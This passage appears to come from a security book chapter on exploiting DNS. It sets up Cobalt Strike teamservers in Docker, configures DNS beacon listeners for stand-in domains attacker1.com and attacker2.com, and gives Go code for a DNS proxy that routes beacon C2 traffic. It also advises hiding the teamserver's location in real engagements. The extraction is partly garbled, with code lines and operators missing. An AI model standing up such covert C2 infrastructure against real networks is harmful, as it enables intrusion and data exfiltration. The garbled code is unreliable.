Creating DNS Server and Proxy
DNS tunneling, a data exfiltration technique, can be a great way to establish 
a C2 channel out of networks with restrictive egress controls. If using an 
authoritative DNS server, an attacker can route through an organization’s 
own DNS servers and out through the internet without having to make a 
direct connection to their own infrastructure. Although slow, it’s difficult to 
defend against. Several open source and proprietary payloads perform DNS 
tunneling, one of which is Cobalt Strike’s Beacon. In this section, you’ll write 
your own DNS server and proxy and learn how to multiplex DNS tunneling 
C2 payloads by using Cobalt Strike.
Configuring Cobalt Strike
If you’ve ever used Cobalt Strike, you may have noticed that, by default, the 
teamserver listens on port 53. Because of this, and by the recommendation 
of the documentation, only a single server should ever be run on a system, 
maintaining a one-to-one ratio. This can become problematic for medium-
to-large teams. For example, if you have 20 teams conducting offensive 
engagements against 20 separate organizations, standing up 20 systems 
capable of running the teamserver could be difficult. This problem isn’t 
unique to Cobalt Strike and DNS; it’s applicable to other protocols, includ-
ing HTTP payloads, such as Metasploit Meterpreter and Empire. Although 
you could establish listeners on a variety of completely unique ports, there’s 
a greater probability of egressing traffic over common ports such as TCP 
80 and 443. So the question becomes, how can you and other teams share 
a single port and route to multiple listeners? The answer is with a proxy, of 
course. Back to the lab.
N O T E 
In real engagements, you’d want to have multiple levels of subterfuge, abstraction, 
and forwarding to disguise the location of your teamserver. This can be done using 
UDP and TCP forwarding through small utility servers using various hosting pro-
viders. The primary teamserver and proxy can also run on separate systems, having 
the teamserver cluster on a large system with plenty of RAM and CPU power.
Let’s run two instances of Cobalt Strike’s teamserver in two Docker con-
tainers. This allows the server to listen on port 53 and lets each teamserver 
have what will effectively be their own system and, consequently, their own 
IP stack. You’ll use Docker’s built-in networking mechanism to map UDP 
ports to the host from the container. Before you begin, download a trial ver-
sion of Cobalt Strike at https://trial.cobaltstrike.com/. After following the trial 
sign-up instructions, you should have a fresh tarball in your download direc-
tory. You’re now ready to start the teamservers.
前沿信安资讯阵地  公众号：i nf osrc
122   Chapter 5
Execute the following in a terminal window to start the first container:
$ docker run --rmu -itv -p 2020:53w -p 50051:50050x -vy full path to 
cobalt strike download:/dataz java{ /bin/bash|
This command does several things. First, you tell Docker to remove 
the container after it exits u, and that you’d like to interact with it after 
starting v. Next, you map port 2020 on your host system to port 53 in the 
container w, and port 50051 to port 50050 x. Next, you map the directory 
containing the Cobalt Strike tarball y to the data directory on the con-
tainer z. You can specify any directory you want and Docker will happily 
create it for you. Finally, provide the image you want to use (in this case, 
Java) { and the command | you’d like to execute on startup. This should 
leave you with a bash shell in the running Docker container.
Once inside the Docker container, start the teamserver by executing 
the following commands:
$ cd /root
$ tar -zxvf /data/cobaltstrike-trial.tgz
$ cd cobaltstrike
$ ./teamserver  
The IP address provided should be that of your actual VM, not the IP 
address of the container.
Next, open a new terminal window on the Ubuntu host and change 
into the directory containing the Cobalt Strike tarball. Execute the follow-
ing commands to install Java and start the Cobalt Strike client:
$ sudo add-apt-repository ppa:webupd8team/java
$ sudo apt update
$ sudo apt install oracle-java8-installer
$ tar -zxvf cobaltstrike-trial.tgz
$ cd cobaltstrike
$ ./cobaltstrike
The GUI for Cobalt Strike should start up. After clearing the trial mes-
sage, change the teamserver port to 50051 and set your username and pass-
word accordingly.
You’ve successfully started and connected to a server running completely 
in Docker! Now, let’s start a second server by repeating the same process. 
Follow the previous steps to start a new teamserver. This time, you’ll map 
different ports. Incrementing the ports by one should do the trick and is 
logical. In a new terminal window, execute the following command to start 
a new container and listen on ports 2021 and 50052: 
$ docker run --rm -it -p 2021:53 -p 50052:50050-v full path to cobalt strike 
download:/data java /bin/bash
前沿信安资讯阵地  公众号：i nf osrc
Exploiting DNS   123
From the Cobalt Strike client, create a new connection by selecting 
Cobalt StrikeNew Connection, modifying the port to 50052, and select-
ing Connect. Once connected, you should see two tabs at the bottom of the 
console, which you can use to switch between servers. 
Now that you’ve successfully connected to the two teamservers, 
you should start two DNS listeners. To create a listener, select Configure 
Listeners from the menu; its icon looks like a pair of headphones. Once 
there, select Add from the bottom menu to bring up the New Listener 
window. Enter the following information:
•
Name: DNS 1
•
Payload: windows/beacon_dns/reverse_dns_txt
•
Host: 
•
Port: 0
In this example, the port is set to 80, but your DNS payload still uses 
port 53, so don’t worry. Port 80 is specifically used for hybrid payloads. 
Figure 5-2 shows the New Listener window and the information you should 
be entering.
Figure 5-2: Adding a new listener
Next, you’ll be prompted to enter the domains to use for beaconing, 
as shown in Figure 5-3. 
Enter the domain attacker1.com as the DNS beacon, which should be the 
domain name to which your payload beacons. You should see a message indi-
cating that a new listener has started. Repeat the process within the other 
teamserver, using DNS 2 and attacker2.com. Before you start using these two 
listeners, you’ll need to write an intermediary server that inspects the DNS 
messages and routes them appropriately. This, essentially, is your proxy.
前沿信安资讯阵地  公众号：i nf osrc
124   Chapter 5
Figure 5-3: Adding the DNS beacon’s domain
Creating a DNS Proxy
The DNS package you’ve been using throughout this chapter makes writing 
an intermediary function easy, and you’ve already used some of these func-
tions in previous sections. Your proxy needs to be able to do the following:
•
Create a handler function to ingest an incoming query
•
Inspect the question in the query and extract the domain name
•
Identify the upstream DNS server correlating to the domain name
•
Exchange the question with the upstream DNS server and write the 
response to the client
Your handler function could be written to handle attacker1.com and 
attacker2.com as static values, but that’s not maintainable. Instead, you 
should look up records from a resource external to the program, such as 
a database or a configuration file. The following code does this by using 
the format of domain,server, which lists the incoming domain and upstream 
server separated by a comma. To start your program, create a function that 
parses a file containing records in this format. The code in Listing 5-6 
should be written into a new file called main.go.
package main
import (
    "bufio"
    "fmt"
    "os"
    "strings"
)
前沿信安资讯阵地  公众号：i nf osrc
Exploiting DNS   125
u func parse(filename string) (map[string]stringv, error) {
    records := make(map[string]string)
    fh, err := os.Open(filename)
    if err != nil {
        return records, err
    }
    defer fh.Close()
    scanner := bufio.NewScanner(fh)
    for scanner.Scan() {
        line := scanner.Text()
        parts := strings.SplitN(line, ",", 2)
        if len(parts)  proxy.config
$ go build
$ ./dns_proxy
map[attacker1.com:127.0.0.1:2020 attacker2.com:127.0.0.1:2021]
What are you looking at here? The output is the mapping between 
teamserver domain names and the port on which the Cobalt Strike DNS 
server is listening. Recall that you mapped ports 2020 and 2021 to port 53 
on your two separate Docker containers. This is a quick and dirty way for 
you to create basic configuration for your tool so you don’t have to store it 
in a database or other persistent storage mechanism.
With a map of records defined, you can now write the handler func-
tion. Let’s refine your code, adding the following to your main() function. 
It should follow the parsing of your config file.
前沿信安资讯阵地  公众号：i nf osrc
126   Chapter 5
u dns.HandleFunc(".",func(w dns.ResponseWriter, req *dns.Msg)v { 
    w if len(req.Question)  1 {
        y name = strings.Join(parts[len(parts)-2:], ".")
    }
    z match, ok:= records[name]
    if !ok {
        dns.HandleFailed(w, req)
        return
    }
    { resp, err := dns.Exchange(req, match)
    if err != nil {
        dns.HandleFailed(w, req)
        return
    }
    | if err := w.WriteMsg(resp); err != nil {
        dns.HandleFailed(w, req)
        return
    }
})
} log.Fatal(dns.ListenAndServe(":53", "udp", nil))
To begin, call HandleFunc() with a period to handle all incoming 
requests u, and define an anonymous function v, which is a function that 
you don’t intend to reuse (it has no name). This is good design when you 
have no intention to reuse a block of code. If you intend to reuse it, you 
should declare and call it as a named function. Next, inspect the incoming 
questions slice to ensure that at least one question is provided w, and if not, 
call HandleFailed() and return to exit the function early. This is a pattern used 
throughout the handler. If at least a single question does exist, you can safely 
pull the requested name from the first question x. Splitting the name by a 
period is necessary to extract the domain name. Splitting the name should 
never result in a value less than 1, but you should check it to be safe. You 
can grab the tail of the slice—the elements at the end of the slice—by using 
the slice operator on the slice y. Now, you need to retrieve the upstream 
server from the records map.
Retrieving a value from a map z can return one or two variables. If the 
key (in our case, a domain name) is present on the map, it will return the 
corresponding value. If the domain isn’t present, it will return an empty 
string. You could check if the returned value is an empty string, but that 
would be inefficient when you start working with types that are more com-
plex. Instead, assign two variables: the first is the value for the key, and the 
second is a Boolean that returns true if the key is found. After ensuring a 
match, you can exchange the request with the upstream server {. You’re 
simply making sure that the domain name for which you’ve received the 
前沿信安资讯阵地  公众号：i nf osrc
Exploiting DNS   127
request is configured in your persistent storage. Next, write the response 
from the upstream server to the client |. With the handler function 
defined, you can start the server }. Finally, you can now build and start 
the proxy.
With the proxy running, you can test it by using the two Cobalt Strike 
listeners. To do this, first create two stageless executables. From Cobalt 
Strike’s top menu, click the icon that looks like a gear, and then change 
the output to Windows Exe. Repeat this process from each teamserver. 
Copy each of these executables to your Windows VM and execute them. 
The DNS server of your Windows VM should be the IP address of your 
Linux host. Otherwise, the test won’t work.
It may take a moment or two, but eventually you should see a new beacon 
on each teamserver. Mission accomplished!
Finishing Touches
This is great, but when you have to change the IP address of your teamserver 
or redirector, or if you have to add a record, you’ll have to restart the server 
as well. Your beacons would likely survive such an action, but why take the 
risk when there’s a much better option? You can use process signals to tell 
your running program that it needs to reload the configuration file. This is 
a trick that I first learned from Matt Holt, who implemented it in the great 
Caddy Server. Listing 5-7 shows the program in its entirety, complete with 
process signaling logic:
package main
import (
    "bufio"
    "fmt"
    "log"
    "os"
    "os/signal"
    "strings"
    "sync"
    "syscall"
    "github.com/miekg/dns"
)
func parse(filename string) (map[string]string, error) {
    records := make(map[string]string)
    fh, err := os.Open(filename)
    if err != nil {
        return records, err
    }
    defer fh.Close()
    scanner := bufio.NewScanner(fh)
    for scanner.Scan() {
        line := scanner.Text()
        parts := strings.SplitN(line, ",", 2)
前沿信安资讯阵地  公众号：i nf osrc
128   Chapter 5
        if len(parts)  %s\n", k, v)
    }
    return records, scanner.Err()
}
func main() {
    u var recordLock sync.RWMutex
    records, err := parse("proxy.config")
    if err != nil {
        panic(err)
    }
    dns.HandleFunc(".", func(w dns.ResponseWriter, req *dns.Msg) {
        if len(req.Question) == 0 {
            dns.HandleFailed(w, req)
            return
        }
        fqdn := req.Question[0].Name
        parts := strings.Split(fqdn, ".")
        if len(parts) >= 2 {
            fqdn = strings.Join(parts[len(parts)-2:], ".")
        }
        v recordLock.RLock()
        match := records[fqdn]
        w recordLock.RUnlock()
        if match == "" {
            dns.HandleFailed(w, req)
            return
        }
        resp, err := dns.Exchange(req, match)